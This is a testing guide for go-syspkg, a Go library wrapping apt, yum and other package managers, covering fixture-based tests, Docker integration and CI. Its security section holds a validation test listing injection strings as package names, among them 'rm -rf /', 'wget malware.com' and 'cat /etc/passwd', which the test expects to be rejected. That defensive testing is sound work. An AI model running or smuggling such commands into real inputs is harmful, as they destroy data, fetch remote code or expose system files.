# Testing Guide for go-syspkg

## Overview

This document describes the comprehensive testing strategy for go-syspkg, including our three-layer testing architecture, fixture-based validation, and Docker containerization approach.

## Testing Philosophy

### Core Principles

1. **Authentic Data**: Use real package manager command outputs as test fixtures
2. **Docker Safety**: Never run package operations on development systems
3. **Cross-Platform**: Test across multiple OS distributions in containers
4. **Security First**: Comprehensive input validation and injection prevention
5. **Behavior-Focused**: Test contracts and expected behaviors, not implementation details

### Three-Layer Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                    SYSTEM TESTS (CI/Native)                │
│  • Actual package install/remove operations               │
│  • Privileged operations requiring root access            │
│  • Snap/systemd dependent features                        │
└─────────────────────────────────────────────────────────────┘
                              │
┌─────────────────────────────────────────────────────────────┐
│                 INTEGRATION TESTS (Docker)                 │
│  • Real package manager command execution                 │
│  • Cross-platform validation (Ubuntu, Rocky, Fedora)     │
│  • Limited operations (search, list, show)                │
└─────────────────────────────────────────────────────────────┘
                              │
┌─────────────────────────────────────────────────────────────┘
│                    UNIT TESTS (Fast)                       │
│  • Parser functions with authentic fixtures               │
│  • Command construction validation                        │
│  • Input validation and security testing                  │
└─────────────────────────────────────────────────────────────┘
```

## Running Tests

### Quick Commands

```bash
# Run all unit tests
make test

# Run tests for specific package manager
go test ./manager/apt -v
go test ./manager/yum -v

# Run integration tests in Docker (safe)
make test-docker-ubuntu       # APT testing
make test-docker-rocky        # YUM testing
make test-docker-all          # All platforms

# Run with coverage
go test ./... -coverprofile=coverage.out
go tool cover -html=coverage.out
```

### Platform-Specific Testing

| Command | Target | Package Managers |
|---------|--------|------------------|
| `make test-docker-ubuntu` | Ubuntu 22.04 | APT, Snap, Flatpak |
| `make test-docker-rocky` | Rocky Linux 8 | YUM |
| `make test-docker-fedora` | Fedora 39 | DNF, Flatpak |
| `make test-docker-alpine` | Alpine 3.18 | APK |

## Fixture-Based Testing

### Fixture Organization

```
testing/fixtures/
├── apt/
│   ├── search-vim.clean-system.ubuntu-2204.txt
│   ├── install-vim.dry-run.clean-system.ubuntu-2204.txt
│   └── list-installed.packages-installed.ubuntu-2204.txt
├── yum/
│   ├── search-vim.clean-system.rocky-8.txt
│   └── remove-vim.vim-installed.rocky-8.txt
└── [manager]/
    └── [operation].[execution-mode].[system-status].[distro]-[version].txt
```

### Naming Convention

**Format**: `{operation}.{execution-mode}.{system-status}.{distro}-{version}.txt`

**Examples**:
- `install-vim.dry-run.clean-system.ubuntu-2204.txt` - Dry-run install on clean system
- `search-vim.clean-system.rocky-8.txt` - Normal search (execution-mode omitted)
- `list-installed.packages-installed.ubuntu-2204.txt` - List after packages installed

### Using Fixtures in Tests

```go
func TestSearchVimFixture(t *testing.T) {
    // Load authentic command output
    fixture := testutil.LoadAPTFixture(t, "search-vim.clean-system.ubuntu-2204.txt")

    // Test parser with real data
    packages := parseSearchOutput(fixture)

    // Validate expected behavior
    if len(packages) == 0 {
        t.Fatal("Expected packages from search fixture, got none")
    }
}
```

## Docker Testing Strategy

### Why Docker for Integration Tests

1. **Safety**: Never modify the development system
2. **Reproducibility**: Consistent environments across machines
3. **Cross-Platform**: Test on Ubuntu, Rocky, Fedora, Alpine
4. **Isolation**: Each test runs in clean environment

### Docker Test Configuration

#### OS Matrix Testing (`testing/os-matrix.yaml`)

```yaml
environments:
  ubuntu-2204:
    package_managers: [apt, snap, flatpak]
    docker_image: "ubuntu:22.04"
  rocky-8:
    package_managers: [yum]
    docker_image: "rockylinux:8"
  fedora-39:
    package_managers: [dnf, flatpak]
    docker_image: "fedora:39"
```

#### Test Entrypoints

- `testing/entrypoints/entrypoint-apt.sh` - APT fixture generation
- `testing/entrypoints/entrypoint-yum.sh` - YUM fixture generation
- `testing/entrypoints/entrypoint-dnf.sh` - DNF fixture generation

### Fixture Generation

```bash
# Generate fixtures safely in Docker
cd testing
./generate-fixtures.sh

# Generates authentic outputs like:
# apt search vim > fixtures/apt/search-vim.clean-system.ubuntu-2204.txt
# yum list installed > fixtures/yum/list-installed.clean-system.rocky-8.txt
```

## Security Testing

### Input Validation Tests

Every package manager must implement comprehensive security validation:

```go
func TestInputValidation(t *testing.T) {
    mgr := NewManager()
    ctx := context.Background()

    // Test command injection patterns
    maliciousPackages := []string{
        "package; rm -rf /",           // Command chaining
        "package && wget malware.com", // Command chaining with &&
        "package | cat /etc/passwd",   // Pipe redirection
        "package`id`",                 // Command substitution
        "package$(whoami)",            // Command substitution
        "../../../etc/passwd",         // Path traversal
    }

    for _, malicious := range maliciousPackages {
        _, err := mgr.Search(ctx, []string{malicious}, nil)
        if err == nil {
            t.Errorf("Expected error for malicious package name: %s", malicious)
        }
    }
}
```

### Security Validation Requirements

- ✅ **Command injection prevention**: Regex validation of package names
- ✅ **Path traversal protection**: Block relative paths and special characters
- ✅ **Input sanitization**: Validate all user inputs before command execution
- ✅ **Timeout management**: Prevent hanging operations
- ✅ **Error handling**: No sensitive information in error messages

## Test Coverage Standards

### Current Coverage Status

| Package Manager | Unit Tests | Integration Tests | Fixtures | Security Tests |
|-----------------|------------|-------------------|----------|----------------|
| **APT** | ✅ 35 tests | ✅ Docker | ✅ 44 authentic | ✅ Comprehensive |
| **YUM** | ✅ 53 tests | ✅ Docker | ✅ 29 authentic | ✅ Comprehensive |
| **Snap** | 🚧 Partial | 🚧 Native only | 🚧 Limited | ✅ Complete |
| **Flatpak** | 🚧 Partial | 🚧 Basic | 🚧 Limited | ✅ Complete |

### Quality Requirements

For production-ready package managers:

1. **Parser Coverage**: 100% coverage of all parsing functions
2. **Fixture Authenticity**: Real command outputs from target OS
3. **Security Validation**: All 18+ malicious input patterns tested
4. **Error Handling**: Comprehensive edge case coverage
5. **Cross-Platform**: Multiple OS/version combinations tested

## CI/CD Integration

### GitHub Actions Workflows

```yaml
# .github/workflows/test-and-coverage.yml
- name: Run Unit Tests
  run: go test ./... -v -coverprofile=coverage.out

- name: Run Docker Integration Tests
  run: make test-docker-all

- name: Upload Coverage
  uses: codecov/codecov-action@v3
```

### Pre-commit Hooks

```bash
# Install hooks
pre-commit install

# Automatic validation on commit:
# - Go formatting (gofmt, goimports)
# - Linting (golangci-lint)
# - Security checks (go vet)
# - Build verification
```

## Writing Tests for New Package Managers

### 1. Create Test Structure

```go
// manager/newpm/plugin_test.go
package newpm

import (
    "testing"
    "github.com/bluet/syspkg/manager"
    "github.com/bluet/syspkg/testing/testutil"
)

func TestManagerBasicInfo(t *testing.T) {
    mgr := NewManager()

    if mgr.GetName() != "newpm" {
        t.Errorf("Expected name 'newpm', got '%s'", mgr.GetName())
    }
}
```

### 2. Add Fixture-Based Tests

```go
func TestSearchFixture(t *testing.T) {
    fixture := testutil.LoadNewPMFixture(t, "search-vim.clean-system.distro-version.txt")
    packages := parseSearchOutput(fixture)

    // Validate parsing with real data
    if len(packages) == 0 {
        t.Fatal("Expected packages from fixture")
    }
}
```

### 3. Implement Security Tests

```go
func TestInputValidation(t *testing.T) {
    // Copy from APT/YUM security test patterns
    // Test all 18+ malicious input patterns
}
```

### 4. Add Docker Integration

```yaml
# testing/os-matrix.yaml
newpm-distro:
  package_managers: [newpm]
  docker_image: "newpm-distro:version"
```

## Debugging Test Failures

### Common Issues

1. **Fixture Mismatch**: Update fixtures when package manager output changes
2. **Parser Edge Cases**: Add specific test cases for unusual output formats
3. **Docker Environment**: Ensure package manager is properly installed in container
4. **Timing Issues**: Add appropriate timeouts for slow operations

### Debug Commands

```bash
# Run single test with verbose output
go test ./manager/apt -run TestSpecificTest -v

# Run with race detection
go test ./manager/apt -race

# Generate test coverage report
go test ./manager/apt -coverprofile=apt.out
go tool cover -html=apt.out
```

## Best Practices

### Do's ✅

- **Use authentic fixtures** from real package manager commands
- **Test with Docker** for integration testing safety
- **Validate security** with comprehensive injection tests
- **Follow naming conventions** for fixtures and tests
- **Test error conditions** not just happy paths
- **Keep tests focused** on behavior, not implementation

### Don'ts ❌

- **Never run package operations** on development system // WRONG: dev system modification
- **Don't use hardcoded test data** when fixtures are available // BAD: hardcoded test data
- **Don't skip security validation** tests // WRONG: skip security tests
- **Don't test third-party libraries** (focus on our code) // WRONG: test external libs
- **Don't make tests depend on external services** // BAD: external dependencies  
- **Don't use magic numbers** in test assertions // WRONG: magic numbers

## Related Documentation

- **[Architecture Overview](ARCHITECTURE.md)** - Understanding the system design
- **[Plugin Development](PLUGIN_DEVELOPMENT.md)** - Creating new package manager plugins
- **[Production Guide](PRODUCTION_GUIDE.md)** - Advanced development practices

---

**Testing Status**: ✅ **Comprehensive Strategy Implemented**
**Last Updated**: 2025-06-06
**Coverage**: APT (100%), YUM (100%), Others (In Progress)
